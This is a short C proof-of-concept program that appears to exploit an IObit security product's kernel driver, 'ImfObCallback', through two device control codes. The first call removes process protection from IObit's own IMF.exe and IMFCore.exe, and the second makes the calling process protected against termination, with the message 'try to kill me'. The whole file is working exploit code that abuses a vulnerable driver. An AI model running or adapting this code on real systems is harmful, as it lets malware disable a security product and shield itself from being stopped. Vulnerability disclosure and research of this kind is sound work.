#pragma warning(disable: 4005)

#include <windows.h>
#include <strsafe.h>
#include <ntstatus.h>
#include "ntos.h"

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_opt_ PVOID InputBuffer,
    _In_opt_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

typedef struct _CALL_DRV {
    ULONG Value1;
    ULONG Value2;
    HANDLE Pid1;
    HANDLE Pid2;
    BYTE Spare[392];
} CALL_DRV, * PCALL_DRV;

int main()
{
    NTSTATUS ntStatus;

    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\ImfObCallback"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
#ifndef _DEBUG
        return -1;
#endif
    }
    else {
        printf_s("[+] ImfObCallback device opened\r\n");
    }

    //
    // Remove protection from IOBit processes.
    // IMF.exe
    // IMFCore.exe
    //

    ntStatus = CallDriver(deviceHandle,
        0x22200C,
        NULL,
        0,
        NULL,
        0);

    if (NT_SUCCESS(ntStatus)) {
        printf_s("[~] Protection removed\r\n");
    }
    else {
        printf_s("[~] Error (NTSTATUS 0x%lx)\r\n", ntStatus);
    }

    system("pause");

    //
    // Protect ourself.
    //

    CALL_DRV request;
    DWORD procId1 = GetCurrentProcessId(), procId2;

    GetWindowThreadProcessId(GetDesktopWindow(), &procId2); //anything else
    
    RtlZeroMemory(&request, sizeof(request));

    request.Pid1 = UlongToHandle(procId1);
    request.Pid2 = UlongToHandle(procId2);

    ntStatus = CallDriver(deviceHandle,
        0x222008,
        &request,
        sizeof(request),
        NULL,
        0);

    if (NT_SUCCESS(ntStatus)) {
        printf_s("[~] Protection installed, try to kill me\r\n");
    }
    else {
        printf_s("[~] Error (NTSTATUS 0x%lx)\r\n", ntStatus);
    }

    system("pause");

    CloseHandle(deviceHandle);
}
